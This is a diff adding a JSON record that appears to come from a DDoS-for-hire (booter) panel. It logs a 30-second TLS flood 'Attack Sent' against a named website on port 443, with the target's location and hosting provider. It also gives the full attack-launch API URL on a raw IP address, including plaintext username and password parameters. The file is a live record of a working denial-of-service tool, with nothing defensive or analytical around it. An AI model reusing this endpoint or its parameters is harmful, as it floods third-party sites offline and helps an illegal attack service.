@@ -1,0 +1,40 @@
+[
+    {
+        "id": "4e2d41c3-7ccf-40f2-8498-3ac323269709",
+        "user": "Vantrong",
+        "host": "https://ngocrongchat.com",
+        "port": 443,
+        "method": "TLS",
+        "time": 30,
+        "timestamp": "2026-04-17T00:52:13.944Z",
+        "status": "expired",
+        "command": "",
+        "mode": "api",
+        "servers": [],
+        "serverNames": "FISEAK-TLS: 1, 2",
+        "apiResults": [
+            {
+                "success": true,
+                "data": {
+                    "error": false,
+                    "message": {
+                        "Credits": "This API is solely owned and made by hejnick https://t.me/hejnick",
+                        "concurrent": "1",
+                        "error": "false",
+                        "message": "Attack Sent",
+                        "method": "tls",
+                        "port": "443",
+                        "target": "https://ngocrongchat.com",
+                        "target_city": "Frankfurt am Main",
+                        "target_country": "DE",
+                        "target_org": "AS58087 Florian Kolb",
+                        "target_region": "Hesse",
+                        "time": "30",
+                        "your_running_attacks": "1/6"
+                    }
+                },
+                "endpoint": "http://45.13.239.151:8080/api/attack?username=fiseak&password=fiseak&target=https%3A%2F%2Fngocrongchat.com&port=443&time=30&method=tls&concs=1"
+            }
+        ]
+    }
+]
